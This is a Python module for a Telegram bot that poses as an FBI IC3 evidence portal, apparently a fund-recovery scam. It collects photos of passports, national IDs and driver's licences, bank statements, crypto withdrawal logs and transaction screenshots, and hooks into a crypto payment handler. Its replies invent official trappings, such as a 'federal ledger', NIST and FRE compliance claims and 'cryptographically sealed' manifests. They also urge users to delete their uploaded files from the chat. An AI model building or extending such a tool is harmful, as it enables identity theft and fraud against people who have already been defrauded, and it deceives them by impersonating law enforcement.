"""
FBI IC3 – ADRI Bot
Evidence Module: /upload, /ingest_evidence, /done, photo handler
"""
import hashlib as _hl
from datetime import datetime

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes

import database as db
from .config import is_admin, logger, S_TXID
from .crs import crs02_asset  # called after screenshot upload
from .keyboards import kb_m02, kb_m02_back_only, kb_evm_continue, kb_evm_seal

_EVM_MODULE_DISPLAY = {
    "EVM-01": "[EVM-01] Identity & Residency Verification",
    "EVM-02": "[EVM-02] Financial Evidence",
    "EVM-03": "[EVM-03] Communication Records",
    "EVM-05": "[EVM-05] Addendum Documentation",
}


def _evm01_ingest_success_body(fname: str, raw_hash: str, status: str = "Financial Trail Logged to Case Index") -> str:
    """EVM-01 单张/最后一张上传成功：回执 + SYSTEM NOTICE + 分隔线（无 Seal 引导文案）。"""
    core = _evm_receipt(
        fname, raw_hash, "EVM-01", status, include_seal_notice=False
    )
    return (
        core
        + "\n\n🛡️ SYSTEM NOTICE:\n"
        + "Your evidence is being synchronized with the federal ledger. "
        + "All entries are digitally signed and hashed for forensic integrity.\n\n"
        + "━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )


def _evm_receipt(fname, h, module, status, module_display=None, include_seal_notice=False):
    """生成证据回执文案；include_seal_notice=True 时追加 SYSTEM NOTICE 与「点击下方 Seal」引导。"""
    sep = "━━━━━━━━━━━━━━━━━━━━━━━━━━"
    display = module_display or _EVM_MODULE_DISPLAY.get(module, f"[{module}] Evidence")
    lines = [
        "✅ INGESTED: " + fname.upper(),
        sep,
        "HASH : " + h[:16] + "..." + h[-4:] + " (SHA-256)",
        "MODULE : " + display,
        "[STATUS] : " + status,
    ]
    if include_seal_notice:
        lines += [
            "",
            "🛡️ SYSTEM NOTICE:",
            "Your evidence is being synchronized with the federal ledger. All entries are digitally signed and hashed for forensic integrity.",
            "",
            "Next Action:",
            "Upload additional receipts or click the button below to Seal & Finalize this module.",
        ]
    return "\n".join(lines)


async def _schedule_pii_purge(ctx, chat_id, case_no):
    async def _job(context):
        for k in ("upload_case_no", "upload_evm_type", "upload_step"):
            context.user_data.pop(k, None)
        sep = chr(0x2500) * 22
        lines = [
            "<code>⚠️ SESSION BUFFER PURGED — PRIVACY COMPLIANCE</code>",
            "<code>" + sep + "</code>",
            "<code>CASE ID  : " + case_no + "</code>",
            "<code>STANDARD : NIST SP 800-53</code>",
            "<code>ACTION   : Buffer cleared from server.</code>",
            "<code>" + sep + "</code>",
            "",
            "🛡️ <b>For your protection, please manually delete your "
            "uploaded files from this chat history immediately.</b>",
        ]
        try:
            await context.bot.send_message(
                chat_id=chat_id, text="\n".join(lines), parse_mode="HTML")
        except Exception:
            pass
    try:
        ctx.job_queue.run_once(_job, when=300, chat_id=chat_id,
                               name=f"pii_{chat_id}")
    except Exception:
        pass


async def cmd_upload(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Handles both /upload and /ingest_evidence."""
    if not ctx.args:
        await update.message.reply_text(
            "<code>[EVM-GATEWAY] COMMAND SYNTAX ERROR</code>\n"
            "<code>────────────────────────────────────</code>\n"
            "<code>USAGE: /ingest_evidence {CASE_ID}</code>\n\n"
            "Example:\n"
            "<code>  /ingest_evidence IC3-2026-REF-9928-X82</code>",
            parse_mode="HTML")
        return

    case_no = ctx.args[0].upper()
    c = await db.get_case_by_no(case_no)
    if not c:
        await update.message.reply_text(
            "<code>[EVM-GATEWAY] CASE LINKAGE FAILED</code>\n"
            "<code>────────────────────────────────────</code>\n"
            f"<code>QUERY  : {case_no}</code>\n"
            "<code>RESULT : No matching record found.</code>\n\n"
            "<i>Verify your Case ID and try again.</i>",
            parse_mode="HTML")
        return

    _cs = str((c or {}).get("status", "")).strip()
    if _cs in ("Closed", "Rejected", "Duplicate", "Archived"):
        sep = "─" * 36
        _uid_r = update.effective_user.id
        await update.message.reply_text("\n".join([
            "<code>[EVM-GATEWAY] UPLOAD BLOCKED</code>",
            f"<code>{sep}</code>",
            f"<code>CASE ID    : {case_no}</code>",
            f"<code>STATUS     : {_cs.upper()}</code>",
            f"<code>UID        : {_uid_r}</code>",
            "<code>ACTION     : Evidence intake suspended.</code>",
            "",
            "<i>This case is no longer accepting new evidence submissions.</i>",
        ]), parse_mode="HTML")
        return

    if not is_admin(update.effective_user.id):
        if c["tg_user_id"] != update.effective_user.id:
            await update.message.reply_text(
                "<code>[EVM-GATEWAY] ACCESS DENIED</code>\n"
                "<code>You may only submit evidence for your own case.</code>",
                parse_mode="HTML")
            return

    ctx.user_data["upload_case_no"] = case_no
    ctx.user_data["upload_step"]    = 1
    _evm_type = ctx.user_data.get("upload_evm_type", "EVM")
    _uid_s    = update.effective_user.id
    _chat_id  = update.effective_chat.id
    _now      = datetime.utcnow()
    _exp      = f"{_now.hour:02d}:{(_now.minute+5)%60:02d}"
    sep       = chr(0x2500) * 22

    _intros = {
        "EVM-01": ("[SYSTEM]: Forensic Link Established. Please prepare your Government ID.\n"
                   "📍 Action: Upload the FRONT of your ID (Passport / License)."),
        "EVM-02": ("[SYSTEM]: Transaction Audit Node Active.\n"
                   "📍 Action: Upload bank statements, wire receipts, or crypto withdrawal logs."),
        "EVM-03": ("[SYSTEM]: Digital Footprint Traceability Active.\n"
                   "📍 Action: Upload uncropped screenshots of subject chat logs / emails."),
        "EVM-05": ("[SYSTEM]: Supplemental Intake Annexure Active.\n"
                   "📍 Action: Send any additional evidence discovered post-filing."),
    }
    _intro = _intros.get(_evm_type,
                         "[SYSTEM]: Evidence Intake Node Active.\n"
                         "📍 Action: Send your evidence files now.")

    _lines = [
        "<code>[EVM-GATEWAY: FORENSIC INTAKE SESSION OPEN]</code>",
        f"<code>{sep}</code>",
        f"<code>CASE ID    : {case_no}</code>",
        f"<code>UID        : {_uid_s}</code>",
        f"<code>MODULE     : {_evm_type}</code>",
        "<code>PROTOCOL   : AES-256 / SHA-256 VERIFIED</code>",
        "<code>STATUS     : AWAITING EVIDENCE UPLOAD</code>",
        f"<code>{sep}</code>",
        "",
        _intro,
        "",
        f"<code>{sep}</code>",
        "🛡️ <b>FEDERAL PRIVACY COMPLIANCE (PII)</b>",
        f"<code>{sep}</code>",
        "<code>[SECURITY]: This intake node follows NIST SP 800-53 privacy standards.</code>",
        "",
        "<b>⚠️ ACTION REQUIRED:</b>",
        "For your protection, this session buffer will be <b>purged in 5 minutes</b>.",
        "Please <b>manually delete</b> uploaded files from this chat history immediately.",
        f"<code>{sep}</code>",
        f"⏳ <code>Node Session Expires: {_exp} UTC</code>",
    ]
    await update.message.reply_text("\n".join(_lines), parse_mode="HTML")
    await _schedule_pii_purge(ctx, _chat_id, case_no)


async def do_evm_seal(target, ctx: ContextTypes.DEFAULT_TYPE):
    """执行证据封存并发送 manifest；target 为带 reply_text 的消息对象（如 update.message 或 callback_query.message）。"""
    case_no = ctx.user_data.pop("upload_case_no", None)
    ctx.user_data.pop("upload_step", None)
    ctx.user_data.pop("upload_evm_type", None)

    if case_no:
        evs = await db.get_evidences(case_no)
        cnt = len(evs)
        sep = chr(0x2500) * 22
        _ts = datetime.now()
        _uid = getattr(getattr(getattr(ctx, "update", None), "effective_user", None), "id", None) or 0
        lines_d = [
            "<code>[EVM-04: FORENSIC INTEGRITY MANIFEST]</code>",
            f"<code>{sep}</code>",
            f"<code>CASE ID      : {case_no}</code>",
            f"<code>UID          : {_uid}</code>",
            f"<code>TOTAL ASSETS : {cnt:02d} FILE(S)</code>",
            f"<code>{sep}</code>",
        ]
        for _i, _ev in enumerate(evs[:10], 1):
            _fn = (_ev.get("filename") or f"FILE_{_i:02d}").upper()
            _fid = str(_ev.get("file_id") or "")
            _h = str(_ev.get("sha256") or _hl.sha256(_fid.encode()).hexdigest())
            lines_d.append(
                f"<code>{_i:02d}. {_fn[:16]:<16} → SHA-256: {_h[:16]}...</code>"
            )
        if cnt > 10:
            lines_d.append(f"<code>    ... and {cnt-10} more file(s)</code>")
        lines_d += [
            f"<code>{sep}</code>",
            "<code>🛡️ INTEGRITY STATUS : CRYPTOGRAPHICALLY SEALED ✅</code>",
            "<code>PROTOCOL         : FIPS 180-4 COMPLIANT</code>",
            "<code>CHAIN OF CUSTODY : FRE RULE 901 LOGGED</code>",
            f"<code>TIMESTAMP        : {_ts.strftime('%Y-%m-%d %H:%M:%S')} UTC</code>",
            f"<code>{sep}</code>",
            "",
            "🛡️ <b>FEDERAL PRIVACY COMPLIANCE (PII)</b>",
            "<b>⚠️ ACTION REQUIRED: Manually delete uploaded files from this chat immediately.</b>",
            "⏳ <i>Session buffer has been cleared per NIST SP 800-53.</i>",
        ]
        await target.reply_text(
            "\n".join(lines_d),
            parse_mode="HTML",
            reply_markup=kb_m02_back_only(),
        )
    else:
        await target.reply_text(
            "<code>[EVM-GATEWAY] NO ACTIVE SESSION</code>\n\n"
            "Start with: <code>/ingest_evidence IC3-CASE-ID</code>",
            parse_mode="HTML",
        )


async def cmd_done(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """/done 命令：封存当前证据会话并发送 manifest；与 🔐 SEAL 按钮共用 do_evm_seal 逻辑。"""
    await do_evm_seal(update.message, ctx)


async def photo_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    state = ctx.user_data.get("state")

    # 延迟导入：避免启动时加载 qrcode，且减轻 bot_modules 包内循环依赖
    from .crypto_payment import handle_cryptopay_manual_photo

    if await handle_cryptopay_manual_photo(update, ctx):
        return

    # EVM-01 Identity document: 已选证件类型，等待上传照片/扫描件
    if state == "EVM01_AWAIT_PHOTO":
        case_no = ctx.user_data.get("upload_case_no")
        doctype = ctx.user_data.get("upload_evm01_doctype", "PASSPORT")
        step = ctx.user_data.get("upload_evm01_step", 1)
        if not case_no:
            await update.message.reply_text(
                "<code>[EVM-GATEWAY] No case linked. Please start from Evidence Upload and enter your Case ID.</code>",
                parse_mode="HTML",
            )
            return
        photo = update.message.photo[-1]
        try:
            file = await photo.get_file()
        except Exception as e:
            logger.error(f"[photo_handler] EVM01 get_file: {e}")
            await update.message.reply_text(
                "<code>[EVM-GATEWAY] Upload timeout. Please resend the image.</code>",
                parse_mode="HTML",
            )
            return
        ts = datetime.now()
        # National ID: front/back 分步命名，其它证件单张
        if doctype == "NID":
            if step == 1:
                fname = f"NID_FRONT_{ts.strftime('%Y%m%d%H%M')}.jpg"
            else:
                fname = f"NID_BACK_{ts.strftime('%Y%m%d%H%M')}.jpg"
        elif doctype == "DL":
            fname = f"DL_PHOTO_PAGE_{ts.strftime('%Y%m%d%H%M')}.jpg"
        else:
            fname = f"{doctype}_PHOTO_PAGE_{ts.strftime('%Y%m%d%H%M')}.jpg"
        # 计算哈希用于回执展示
        raw_hash = _hl.sha256(
            f"{file.file_id}|{fname}|{case_no}|{ts.isoformat()}".encode()
        ).hexdigest()

        ok = await db.add_evidence(
            case_no,
            f"EVM-01-{doctype}",
            file.file_id,
            fname,
            update.message.caption or "",
        )
        if not ok:
            await update.message.reply_text(
                "<code>[EVM-GATEWAY] Ingestion failed. Case not found or session expired.</code>",
                parse_mode="HTML",
            )
            return

        # National ID: 先正面、再反面，双步交互
        if doctype == "NID" and step == 1:
            ctx.user_data["upload_evm01_step"] = 2
            sep = "────────────────────"
            lines = [
                _evm_receipt(fname, raw_hash, "EVM-01", "Front Side Logged to Case Index"),
                "",
                "Next Action: Upload the BACK side of your NATIONAL ID.",
            ]
            await update.message.reply_text("\n".join(lines), parse_mode="HTML")
            return

        # 完成：Passport / Driver's License 单张，National ID 第二张
        ctx.user_data.pop("state", None)
        ctx.user_data.pop("upload_evm01_doctype", None)
        ctx.user_data.pop("upload_evm01_step", None)
        body = _evm01_ingest_success_body(fname, raw_hash)
        await update.message.reply_text(
            body,
            parse_mode="HTML",
            reply_markup=kb_evm_continue(),
        )
        return

    # TXID screenshot during CRS-02
    if state == S_TXID:
        photo = update.message.photo[-1]
        file  = await photo.get_file()
        ctx.user_data["txid"] = f"file:{file.file_id}"
        await update.message.reply_text("✅ Screenshot received and encrypted.")
        await crs02_asset(update.message, ctx)
        return

    # Evidence upload session
    case_no = ctx.user_data.get("upload_case_no")
    if case_no:
        evm  = ctx.user_data.get("upload_evm_type", "EVM")
        step = ctx.user_data.get("upload_step", 1)
        photo = update.message.photo[-1]
        try:
            file = await photo.get_file()
        except Exception as _fe:
            logger.error(f"[photo_handler] get_file error: {_fe}")
            await update.message.reply_text(
                "<code>[EVM-GATEWAY] UPLOAD TIMEOUT</code>\n"
                "<code>File transfer failed. Please resend the file.</code>",
                parse_mode="HTML")
            return

        ts = datetime.now()
        _fn_map = {
            "EVM-01": {1: "ID_FRONT.JPG",  2: "ID_BACK.JPG"},
            "EVM-02": {1: f"TX_RECEIPT_{step:02d}.JPG"},
            "EVM-03": {1: f"CHAT_LOG_SCREENSHOT_{step:02d}.PNG"},
            "EVM-05": {1: f"ANNEX_{chr(64+min(step,26))}_DATA.JPG"},
        }
        fname = (_fn_map.get(evm, {}).get(step)
                 or _fn_map.get(evm, {}).get(1)
                 or f"EVIDENCE_{step:02d}.JPG")
        raw_hash = _hl.sha256(
            f"{file.file_id}|{fname}|{case_no}|{ts.isoformat()}".encode()
        ).hexdigest()

        ok = await db.add_evidence(case_no, "IMAGE", file.file_id,
                                   fname, update.message.caption or "")
        if not ok:
            await update.message.reply_text(
                "<code>[EVM-GATEWAY] INGESTION FAILED</code>\n"
                "<code>Case not found or session expired.</code>\n\n"
                "Run <code>/ingest_evidence IC3-CASE-ID</code> to restart.",
                parse_mode="HTML")
            return

        sep = chr(0x2500) * 22

        if evm == "EVM-01":
            if step == 1:
                ctx.user_data["upload_step"] = 2
                parts = [_evm_receipt(fname, raw_hash, evm, "Metadata Indexed / Ready for Step 2"),
                         "", f"<code>{sep}</code>",
                         "📍 <b>Step 2 — Upload BACK of ID</b>",
                         "<code>Action: Upload the BACK of your ID.</code>"]
                await update.message.reply_text("\n".join(parts), parse_mode="HTML")
            else:
                ctx.user_data["upload_step"] = 1
                parts = [_evm01_ingest_success_body(fname, raw_hash, "Identity Packet Complete")]
                await update.message.reply_text(
                    "\n".join(parts),
                    parse_mode="HTML",
                    reply_markup=kb_evm_continue(),
                )
        elif evm == "EVM-02":
            ctx.user_data["upload_step"] = step + 1
            parts = [_evm_receipt(fname, raw_hash, evm, "Financial Trail Logged to Case Index", include_seal_notice=True)]
            await update.message.reply_text(
                "\n".join(parts),
                parse_mode="HTML",
                reply_markup=kb_evm_seal(),
            )
        elif evm == "EVM-03":
            ctx.user_data["upload_step"] = step + 1
            parts = [_evm_receipt(fname, raw_hash, evm, "Subject Metadata Extraction Pending", include_seal_notice=True)]
            await update.message.reply_text(
                "\n".join(parts),
                parse_mode="HTML",
                reply_markup=kb_evm_seal(),
            )
        elif evm == "EVM-05":
            ctx.user_data["upload_step"] = step + 1
            parts = [_evm_receipt(fname, raw_hash, evm, "Linked to Primary Case Node", include_seal_notice=True)]
            await update.message.reply_text(
                "\n".join(parts),
                parse_mode="HTML",
                reply_markup=kb_evm_seal(),
            )
        else:
            parts = [_evm_receipt(fname, raw_hash, evm, "Forensically Indexed", include_seal_notice=True)]
            await update.message.reply_text(
                "\n".join(parts),
                parse_mode="HTML",
                reply_markup=kb_evm_seal(),
            )
        return

    await update.message.reply_text(
        "<code>[EVM-GATEWAY] NO ACTIVE SESSION</code>\n\n"
        "To link a file to a case:\n"
        "<code>/ingest_evidence IC3-YYYY-REF-NNNN-XXX</code>",
        parse_mode="HTML")


async def document_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """EVM-01: 接受 PDF/文档 作为证件扫描（与照片同等处理）"""
    state = ctx.user_data.get("state")
    if state != "EVM01_AWAIT_PHOTO":
        await update.message.reply_text(
            "<code>[EVM-GATEWAY] NO ACTIVE SESSION</code>\n\n"
            "To link a file to a case:\n"
            "<code>/ingest_evidence IC3-YYYY-REF-NNNN-XXX</code>",
            parse_mode="HTML",
        )
        return
    case_no = ctx.user_data.get("upload_case_no")
    doctype = ctx.user_data.get("upload_evm01_doctype", "PASSPORT")
    step = ctx.user_data.get("upload_evm01_step", 1)
    if not case_no:
        await update.message.reply_text(
            "<code>[EVM-GATEWAY] No case linked. Please start from Evidence Upload and enter your Case ID.</code>",
            parse_mode="HTML",
        )
        return
    doc = update.message.document
    try:
        file_id = doc.file_id
        fname = doc.file_name or f"{doctype}_PHOTO_PAGE.pdf"
    except Exception as e:
        logger.error(f"[document_handler] EVM01: {e}")
        await update.message.reply_text(
            "<code>[EVM-GATEWAY] Invalid document. Please resend.</code>",
            parse_mode="HTML",
        )
        return

    ts = datetime.now()
    raw_hash = _hl.sha256(
        f"{file_id}|{fname}|{case_no}|{ts.isoformat()}".encode()
    ).hexdigest()

    ok = await db.add_evidence(
        case_no,
        f"EVM-01-{doctype}",
        file_id,
        fname,
        update.message.caption or "",
    )
    if not ok:
        await update.message.reply_text(
            "<code>[EVM-GATEWAY] Ingestion failed. Case not found or session expired.</code>",
            parse_mode="HTML",
        )
        return

    # National ID: 先正面、再反面
    if doctype == "NID" and step == 1:
        ctx.user_data["upload_evm01_step"] = 2
        lines = [
            _evm_receipt(fname, raw_hash, "EVM-01", "Front Side Logged to Case Index"),
            "",
            "Next Action: Upload the BACK side of your NATIONAL ID.",
        ]
        await update.message.reply_text("\n".join(lines), parse_mode="HTML")
        return

    ctx.user_data.pop("state", None)
    ctx.user_data.pop("upload_evm01_doctype", None)
    ctx.user_data.pop("upload_evm01_step", None)
    body = _evm01_ingest_success_body(fname, raw_hash)
    await update.message.reply_text(
        body,
        parse_mode="HTML",
        reply_markup=kb_evm_continue(),
    )
